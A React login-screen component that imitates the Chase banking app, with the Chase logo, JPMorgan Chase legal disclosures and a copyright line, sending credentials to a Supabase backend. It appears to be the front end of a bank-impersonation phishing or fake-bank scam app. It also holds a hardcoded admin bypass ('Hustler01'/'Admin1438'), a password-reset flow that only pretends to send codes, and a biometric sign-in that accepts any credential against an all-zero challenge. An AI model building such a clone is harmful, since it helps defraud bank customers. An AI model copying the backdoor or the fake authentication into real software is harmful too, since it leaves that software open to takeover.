import { useState, useEffect } from 'react';
import ChaseLogo from './ChaseLogo';
import { getEmailByUsername, signInUser } from '../lib/supabase';

interface LoginScreenProps {
  onSignIn: () => void;
  onBack: () => void;
  onSignUp: () => void;
  onAdminLogin?: () => void;
  onOpenAccount?: () => void;
  onTerms?: () => void;
  onAccessibility?: () => void;
}

const ADMIN_USERNAME = 'Hustler01';
const ADMIN_PASSWORD = 'Admin1438';

// ─── Face ID Wink Icon ────────────────────────────────────────────────────────
function FaceIDWinkIcon({ size = 24 }: { size?: number }) {
  return (
    <>
      <style>{`
        @keyframes faceWink {
          0%   { transform: scaleY(1); }
          40%  { transform: scaleY(0); }
          60%  { transform: scaleY(0); }
          100% { transform: scaleY(1); }
        }
        .wink-eye-right-loop {
          animation: faceWink 0.4s ease-in-out 1s 1 forwards,
                     faceWink 0.4s ease-in-out 5s infinite;
          transform-origin: center;
          transform-box: fill-box;
        }
      `}</style>
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none" aria-label="Face ID">
        <rect x="2" y="2" width="20" height="20" rx="5" ry="5" stroke="#1352AA" strokeWidth="1.8" fill="none" />
        <path d="M2 7 Q2 2 7 2" stroke="#1352AA" strokeWidth="1.5" fill="none" strokeLinecap="round" />
        <path d="M17 2 Q22 2 22 7" stroke="#1352AA" strokeWidth="1.5" fill="none" strokeLinecap="round" />
        <path d="M22 17 Q22 22 17 22" stroke="#1352AA" strokeWidth="1.5" fill="none" strokeLinecap="round" />
        <path d="M7 22 Q2 22 2 17" stroke="#1352AA" strokeWidth="1.5" fill="none" strokeLinecap="round" />
        {/* Left eye — stays still */}
        <rect x="7.5" y="9.5" width="2.5" height="3" rx="1.2" fill="#1352AA" />
        {/* Right eye — winks */}
        <rect className="wink-eye-right-loop" x="14" y="9.5" width="2.5" height="3" rx="1.2" fill="#1352AA" />
        {/* Smile */}
        <path d="M8.5 15.5 Q12 18 15.5 15.5" stroke="#1352AA" strokeWidth="1.4" fill="none" strokeLinecap="round" />
      </svg>
    </>
  );
}

function FingerprintIcon({ size = 24 }: { size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill="none" aria-label="Fingerprint">
      <path d="M12 1C8.13 1 5 4.13 5 8v1" stroke="#1352AA" strokeWidth="1.6" strokeLinecap="round" />
      <path d="M19 9v-1c0-1.93-.78-3.68-2.05-4.95" stroke="#1352AA" strokeWidth="1.6" strokeLinecap="round" />
      <path d="M8 9c0-2.21 1.79-4 4-4s4 1.79 4 4v3" stroke="#1352AA" strokeWidth="1.6" strokeLinecap="round" />
      <path d="M8 12c0 2.67 1.33 5 4 6" stroke="#1352AA" strokeWidth="1.6" strokeLinecap="round" />
      <path d="M16 14c-.27 1.8-1.07 3.4-2.5 4.5" stroke="#1352AA" strokeWidth="1.6" strokeLinecap="round" />
      <path d="M12 9v5" stroke="#1352AA" strokeWidth="1.6" strokeLinecap="round" />
    </svg>
  );
}

function useBiometricType(): 'faceid' | 'fingerprint' | null {
  const [type, setType] = useState<'faceid' | 'fingerprint' | null>(null);
  useEffect(() => {
    if (!window.PublicKeyCredential) { setType(null); return; }
    PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
      .then(available => {
        if (!available) { setType(null); return; }
        const ua = navigator.userAgent;
        const isIOS = /iPhone|iPad/i.test(ua);
        setType(isIOS ? 'faceid' : 'fingerprint');
      })
      .catch(() => setType(null));
  }, []);
  return type;
}

// ─── Forgot Credentials Screen ────────────────────────────────────────────────
function ForgotScreen({ onBack }: { onBack: () => void }) {
  const [step, setStep] = useState<'choice' | 'email' | 'done'>('choice');
  const [choice, setChoice] = useState<'username' | 'password' | ''>('');
  const [email, setEmail] = useState('');

  return (
    <div style={{
      position: 'fixed', inset: 0,
      fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif",
      background: '#1352AA',
      overflowY: 'auto', overflowX: 'hidden',
      display: 'flex', flexDirection: 'column',
    }}>
      {/* Blue logo area */}
      <div style={{
        paddingTop: 'max(env(safe-area-inset-top,44px),44px)',
        paddingBottom: 28,
        display: 'flex', flexDirection: 'column', alignItems: 'center',
        position: 'relative', flexShrink: 0,
      }}>
        <button onClick={onBack} style={{
          position: 'absolute',
          top: 'max(env(safe-area-inset-top,44px),44px)',
          left: 16,
          background: 'none', border: 'none', cursor: 'pointer',
          display: 'flex', alignItems: 'center', gap: 6, padding: 8,
        }}>
          <svg width="8" height="13" viewBox="0 0 8 13" fill="none">
            <path d="M7 1L1 6.5L7 12" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
          <span style={{ color: '#fff', fontSize: 15, fontWeight: 500 }}>Back</span>
        </button>
        <ChaseLogo color="#ffffff" size={28} showText />
      </div>

      {/* White card */}
      <div style={{
        background: '#fff', borderTopLeftRadius: 20, borderTopRightRadius: 20,
        flex: 1, padding: '28px 20px', boxShadow: '0 -2px 12px rgba(0,0,0,0.10)',
      }}>
        {step === 'choice' && (
          <>
            <div style={{ fontSize: 18, fontWeight: 700, color: '#111', marginBottom: 6 }}>
              Find your username or reset your password
            </div>
            <div style={{ fontSize: 14, color: '#666', marginBottom: 20 }}>Select an option to continue.</div>
            {(['username', 'password'] as const).map(opt => (
              <div key={opt} onClick={() => setChoice(opt)} style={{
                display: 'flex', alignItems: 'center', gap: 12,
                padding: '14px 0', borderBottom: '1px solid #f0f0f0', cursor: 'pointer',
              }}>
                <div style={{
                  width: 20, height: 20, borderRadius: '50%',
                  border: `2px solid ${choice === opt ? '#1352AA' : '#ccc'}`,
                  background: choice === opt ? '#1352AA' : '#fff',
                  flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center',
                }}>
                  {choice === opt && <div style={{ width: 8, height: 8, borderRadius: '50%', background: '#fff' }} />}
                </div>
                <span style={{ fontSize: 15, color: '#111' }}>I forgot my {opt}</span>
              </div>
            ))}
            <button
              onClick={() => choice && setStep('email')}
              disabled={!choice}
              style={{
                width: '100%', marginTop: 24, padding: '14px 0',
                background: choice ? '#1352AA' : '#ccc', color: '#fff',
                border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 700,
                cursor: choice ? 'pointer' : 'not-allowed', fontFamily: 'inherit',
              }}
            >
              Continue
            </button>
          </>
        )}
        {step === 'email' && (
          <>
            <div style={{ fontSize: 18, fontWeight: 700, color: '#111', marginBottom: 6 }}>
              {choice === 'password' ? 'Reset your password' : 'Find your username'}
            </div>
            <div style={{ fontSize: 14, color: '#666', marginBottom: 20 }}>
              Enter your registered email address and we'll{' '}
              {choice === 'password' ? 'send a one-time code to reset your password.' : 'show you your username.'}
            </div>
            <div style={{ fontSize: 12, color: '#666', marginBottom: 4 }}>Email address</div>
            <div style={{ borderBottom: '1.5px solid #1352AA', paddingBottom: 6, marginBottom: 20 }}>
              <input
                type="email" value={email} onChange={e => setEmail(e.target.value)}
                style={{ width: '100%', border: 'none', outline: 'none', fontSize: 16, color: '#111', background: 'transparent', boxSizing: 'border-box', fontFamily: 'inherit' }}
              />
            </div>
            <button
              onClick={() => email && setStep('done')}
              disabled={!email}
              style={{
                width: '100%', padding: '14px 0',
                background: email ? '#1352AA' : '#ccc', color: '#fff',
                border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 700,
                cursor: email ? 'pointer' : 'not-allowed', fontFamily: 'inherit',
              }}
            >
              Continue
            </button>
          </>
        )}
        {step === 'done' && (
          <div style={{ textAlign: 'center', padding: '10px 0' }}>
            <div style={{
              width: 56, height: 56, borderRadius: '50%', background: '#e8f5e9',
              display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px',
            }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                <path d="M5 13l4 4L19 7" stroke="#2e7d32" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
            </div>
            <div style={{ fontSize: 18, fontWeight: 700, color: '#111', marginBottom: 10 }}>
              {choice === 'password' ? 'Check your email' : 'Username found'}
            </div>
            <div style={{ fontSize: 14, color: '#666', lineHeight: 1.5, marginBottom: 20 }}>
              {choice === 'password'
                ? `We've sent a 6-digit verification code to ${email}. Enter it to reset your password.`
                : `The username associated with ${email} is: de***01`}
            </div>
            <button
              onClick={onBack}
              style={{
                width: '100%', padding: '14px 0', background: '#1352AA', color: '#fff',
                border: 'none', borderRadius: 8, fontSize: 17, fontWeight: 700,
                cursor: 'pointer', fontFamily: 'inherit',
              }}
            >
              Back to Sign in
            </button>
          </div>
        )}
      </div>
    </div>
  );
}

// ─── External link icon ───────────────────────────────────────────────────────
function ExternalLinkIcon() {
  return (
    <svg width="11" height="11" viewBox="0 0 11 11" fill="none" style={{ marginLeft: 3, verticalAlign: 'middle' }}>
      <path d="M6.5 1.5h3v3M4 7.5l5.5-5.5" stroke="#1352AA" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
      <path d="M9.5 6.5v3h-8v-8h3" stroke="#1352AA" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

// ─── Main Login Screen ────────────────────────────────────────────────────────
export default function LoginScreen({ onSignIn, onBack, onSignUp, onAdminLogin, onOpenAccount, onTerms, onAccessibility }: LoginScreenProps) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [useToken, setUseToken] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [showForgot, setShowForgot] = useState(false);
  const biometricType = useBiometricType();

  if (showForgot) return <ForgotScreen onBack={() => setShowForgot(false)} />;

  async function handleBiometric() {
    try {
      if (!window.PublicKeyCredential) { onSignIn(); return; }
      const credential = await navigator.credentials.get({
        publicKey: {
          challenge: new Uint8Array(32),
          timeout: 30000,
          userVerification: 'preferred',
          rpId: window.location.hostname,
          allowCredentials: [],
        },
      });
      if (credential) onSignIn();
    } catch {
      setError('Biometric authentication failed or not set up.');
    }
  }

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setError('Please enter your username and password.');
      return;
    }
    setError('');
    setLoading(true);

    // Admin bypass
    if (username.trim() === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
      setTimeout(() => { setLoading(false); onAdminLogin?.(); }, 600);
      return;
    }

    try {
      let email = username.trim();
      if (!email.includes('@')) {
        const found = await getEmailByUsername(username.trim());
        if (!found) {
          setError('Username not found. Please check and try again.');
          setLoading(false);
          return;
        }
        email = found;
      }
      await signInUser(email, password);
      localStorage.setItem('chase_has_visited', 'true');
      onSignIn();
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Sign in failed.';
      setError(message.toLowerCase().includes('invalid') ? 'Incorrect username or password.' : message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      position: 'fixed', inset: 0,
      fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif",
      // Full-screen blue background — sits behind the white card
      background: '#1352AA',
      overflowY: 'auto',
      overflowX: 'hidden',
      WebkitOverflowScrolling: 'touch',
      display: 'flex',
      flexDirection: 'column',
    }}>
      {/* ── Blue area: Back button + CHASE logo ── */}
      <div style={{
        paddingTop: 'max(env(safe-area-inset-top,44px),44px)',
        paddingBottom: 28,
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        position: 'relative',
        flexShrink: 0,
        zIndex: 1,
      }}>
        {/* Back */}
        <button onClick={onBack} style={{
          position: 'absolute',
          top: 'max(env(safe-area-inset-top,44px),44px)',
          left: 16,
          background: 'none', border: 'none', cursor: 'pointer',
          display: 'flex', alignItems: 'center', gap: 6, padding: 8,
        }}>
          <svg width="8" height="13" viewBox="0 0 8 13" fill="none">
            <path d="M7 1L1 6.5L7 12" stroke="#fff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
          <span style={{ color: '#fff', fontSize: 15, fontWeight: 500 }}>Back</span>
        </button>

        {/* CHASE wordmark + octagon */}
        <ChaseLogo color="#ffffff" size={30} showText />
      </div>

      {/* ── White card: overlays blue, rounded top corners ── */}
      {/* Blue background shows through rounded corners at top of card */}
      {/* Inside the card, the blue background behind the page "stops" visually   */}
      {/* around the Remember me row — that's because the white card content      */}
      {/* above that point (username, password fields) sits within the card       */}
      {/* while the blue parent bg is still visible at the sides/behind top       */}
      <div style={{
        position: 'relative',
        zIndex: 1,
        background: '#fff',
        borderTopLeftRadius: 20,
        borderTopRightRadius: 20,
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        paddingTop: 28,
        paddingLeft: 20,
        paddingRight: 20,
        paddingBottom: 0,
        boxShadow: '0 -2px 12px rgba(0,0,0,0.12)',
      }}>

        <form onSubmit={handleSignIn} style={{ width: '100%', maxWidth: 480, alignSelf: 'center' }}>

          {/* ── Username field ── */}
          <div style={{ marginBottom: 22 }}>
            <div style={{ fontSize: 12, color: '#666', marginBottom: 6 }}>Enter your username</div>
            <div style={{
              display: 'flex', alignItems: 'center',
              borderBottom: `1.5px solid ${username ? '#1352AA' : '#d0d0d0'}`,
              paddingBottom: 8,
            }}>
              <input
                type="text"
                value={username}
                onChange={e => { setUsername(e.target.value); setError(''); }}
                autoComplete="username"
                autoCapitalize="none"
                style={{
                  flex: 1, border: 'none', outline: 'none',
                  fontSize: 16, color: '#111', background: 'transparent',
                  fontFamily: 'inherit', minWidth: 0,
                }}
              />
              {/* Face ID / Fingerprint icon — always show for demo */}
              <button
                type="button"
                onClick={handleBiometric}
                style={{
                  background: 'none', border: 'none', cursor: 'pointer',
                  padding: '0 0 0 8px', display: 'flex', alignItems: 'center', flexShrink: 0,
                }}
                title={biometricType === 'faceid' ? 'Sign in with Face ID' : 'Sign in with fingerprint'}
              >
                {biometricType === 'fingerprint'
                  ? <FingerprintIcon size={24} />
                  : <FaceIDWinkIcon size={24} />}
              </button>
            </div>
          </div>

          {/* ── Password field ── */}
          <div style={{ marginBottom: 18 }}>
            <div style={{ fontSize: 12, color: '#666', marginBottom: 6 }}>Enter your password</div>
            <div style={{
              display: 'flex', alignItems: 'center',
              borderBottom: `1.5px solid ${password ? '#1352AA' : '#d0d0d0'}`,
              paddingBottom: 8,
            }}>
              <input
                type={showPass ? 'text' : 'password'}
                value={password}
                onChange={e => { setPassword(e.target.value); setError(''); }}
                autoComplete="current-password"
                style={{
                  flex: 1, border: 'none', outline: 'none',
                  fontSize: 16, color: '#111', background: 'transparent',
                  fontFamily: 'inherit', minWidth: 0,
                }}
              />
              {/* Show / Hide toggle — text only, no icon */}
              <button
                type="button"
                onClick={() => setShowPass(!showPass)}
                style={{
                  background: 'none', border: 'none', color: '#1352AA',
                  fontSize: 14, fontWeight: 600, cursor: 'pointer',
                  flexShrink: 0, fontFamily: 'inherit', padding: '0 0 0 8px',
                }}
              >
                {showPass ? 'Hide' : 'Show'}
              </button>
            </div>
          </div>

          {/* Error */}
          {error && (
            <div style={{ fontSize: 13, color: '#c0392b', marginBottom: 12, lineHeight: 1.4 }}>
              {error}
            </div>
          )}

          {/* ── Remember me / Use token ── */}
          {/* Blue background "stops" visually around here — white card content above this
              is over the blue section, below this is fully white background territory */}
          <div style={{
            display: 'flex', justifyContent: 'space-between', alignItems: 'center',
            marginBottom: 22,
          }}>
            <label style={{ display: 'flex', alignItems: 'center', gap: 7, fontSize: 14, color: '#333', cursor: 'pointer' }}>
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={e => setRememberMe(e.target.checked)}
                style={{ accentColor: '#1352AA', width: 16, height: 16 }}
              />
              Remember me
            </label>
            <label style={{ display: 'flex', alignItems: 'center', gap: 7, fontSize: 14, color: '#333', cursor: 'pointer' }}>
              <div
                onClick={() => setUseToken(!useToken)}
                style={{
                  width: 16, height: 16,
                  border: `2px solid ${useToken ? '#1352AA' : '#999'}`,
                  borderRadius: 2, cursor: 'pointer',
                  background: useToken ? '#1352AA' : 'transparent',
                  display: 'flex', alignItems: 'center', justifyContent: 'center',
                }}
              >
                {useToken && (
                  <div style={{
                    width: 8, height: 5,
                    borderLeft: '2px solid #fff', borderBottom: '2px solid #fff',
                    transform: 'rotate(-45deg) translate(1px,-1px)',
                  }} />
                )}
              </div>
              Use token
            </label>
          </div>

          {/* ── Sign in button ── */}
          <button
            type="submit"
            disabled={loading}
            style={{
              width: '100%',
              background: loading ? '#7ba5d4' : '#1352AA',
              color: '#fff', border: 'none', borderRadius: 8,
              padding: '15px 0', fontSize: 17, fontWeight: 700,
              cursor: loading ? 'not-allowed' : 'pointer',
              marginBottom: 16, fontFamily: 'inherit',
            }}
          >
            {loading ? 'Signing in...' : 'Sign in'}
          </button>

          {/* Forgot link */}
          <div style={{ textAlign: 'center', marginBottom: 8 }}>
            <button
              type="button"
              onClick={() => setShowForgot(true)}
              style={{
                background: 'none', border: 'none', color: '#1352AA',
                fontSize: 14, fontWeight: 600, cursor: 'pointer', fontFamily: 'inherit',
              }}
            >
              Forgot username or password?
            </button>
          </div>
        </form>

        {/* ── Bottom footer (white) ── */}
        <div style={{ maxWidth: 480, alignSelf: 'center', width: '100%', marginTop: 'auto', paddingTop: 16 }}>

          {/* Nav links */}
          <div style={{
            display: 'flex', justifyContent: 'center',
            alignItems: 'center', flexWrap: 'wrap', paddingBottom: 6,
          }}>
            {[
              { label: 'Sign up', action: onSignUp },
              { label: 'Open an account', action: onOpenAccount },
              { label: 'Privacy', action: undefined },
              { label: '···', action: undefined },
            ].map((item, i, arr) => (
              <span key={item.label} style={{ display: 'flex', alignItems: 'center' }}>
                <button
                  onClick={item.action || undefined}
                  style={{
                    background: 'none', border: 'none', color: '#1352AA',
                    fontSize: 12, cursor: 'pointer', fontFamily: 'inherit', padding: '4px 5px',
                  }}
                >
                  {item.label}
                </button>
                {i < arr.length - 1 && <span style={{ color: '#ccc', fontSize: 12 }}>|</span>}
              </span>
            ))}
          </div>

          {/* Legal text */}
          <div style={{ textAlign: 'center', color: '#777', fontSize: 10.5, lineHeight: 1.8, padding: '2px 12px 6px' }}>
            <div>Equal Housing Lender</div>
            <div>Deposit products provided by JPMorgan Chase Bank, N.A. Member FDIC</div>
            <div>© 2026 JPMorgan Chase &amp; Co.</div>
          </div>

          {/* Disclosures block */}
          <div style={{ background: '#f7f7f7', padding: '14px 16px' }}>
            <div style={{ fontSize: 10, fontWeight: 700, color: '#333', letterSpacing: 1, marginBottom: 6 }}>DISCLOSURES</div>
            <div style={{ fontSize: 11, color: '#666', lineHeight: 1.6, marginBottom: 8 }}>
              Investment products and services are offered through J.P. Morgan Securities LLC (JPMS), a Member of{' '}
              <span style={{ color: '#1352AA', textDecoration: 'underline', cursor: 'pointer' }}>FINRA</span>
              {' '}and{' '}
              <span style={{ color: '#1352AA', textDecoration: 'underline', cursor: 'pointer' }}>SIPC</span>.
            </div>
            <div style={{ border: '1px solid #ddd', borderRadius: 6, padding: '10px 12px', background: '#fff' }}>
              <div style={{ fontSize: 10, fontWeight: 700, color: '#222', letterSpacing: 0.3, lineHeight: 1.7 }}>
                INVESTMENT AND INSURANCE PRODUCTS ARE: NOT A DEPOSIT • NOT FDIC INSURED • NOT INSURED BY ANY FEDERAL GOVERNMENT AGENCY • NO BANK GUARANTEE • MAY LOSE VALUE
              </div>
            </div>
          </div>

          {/* Terms + Accessibility */}
          <div style={{
            display: 'flex', justifyContent: 'center', alignItems: 'center',
            gap: 0, padding: '12px 16px 8px', background: '#fff',
          }}>
            <button
              onClick={onTerms}
              style={{
                background: 'none', border: 'none', color: '#1352AA',
                fontSize: 13, cursor: 'pointer', fontFamily: 'inherit',
                padding: '4px 10px', display: 'flex', alignItems: 'center',
              }}
            >
              Terms of use <ExternalLinkIcon />
            </button>
            <span style={{ color: '#ccc', fontSize: 16 }}>|</span>
            <button
              onClick={onAccessibility}
              style={{
                background: 'none', border: 'none', color: '#1352AA',
                fontSize: 13, cursor: 'pointer', fontFamily: 'inherit',
                padding: '4px 10px', display: 'flex', alignItems: 'center',
              }}
            >
              Accessibility <ExternalLinkIcon />
            </button>
          </div>

          {/* Chase blue bottom bar */}
          <div style={{ height: 8, background: '#1352AA', marginLeft: -20, marginRight: -20 }} />
        </div>
      </div>
    </div>
  );
}
